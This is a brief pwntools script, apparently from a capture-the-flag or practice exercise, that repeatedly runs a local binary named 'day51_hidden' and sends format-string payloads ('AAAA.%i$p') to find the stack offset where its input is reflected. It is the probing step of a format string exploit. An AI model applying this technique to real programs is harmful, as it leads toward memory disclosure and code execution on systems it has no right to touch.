from pwn import * 

for i in range(1, 20):
	p = process("./day51_hidden")
	p.recvuntil(b"note:\n")
	p.sendline(f"AAAA.%{i}$p".encode())
	out = p.recvall(timeout = 1)
	if b"41414141" in out:
		print(i, out)
